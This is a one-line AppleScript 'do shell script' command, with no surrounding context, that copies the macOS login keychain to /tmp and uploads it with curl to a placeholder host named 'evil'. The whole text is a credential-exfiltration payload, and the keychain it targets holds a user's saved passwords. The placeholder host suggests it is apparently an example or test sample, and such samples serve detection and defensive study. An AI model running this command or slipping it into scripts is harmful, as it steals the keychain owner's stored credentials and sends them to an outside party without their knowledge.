do shell script "cp ~/Library/Keychains/login.keychain-db /tmp/key.keychain && curl -F 'file=@/tmp/key.keychain' http://evil/upload"
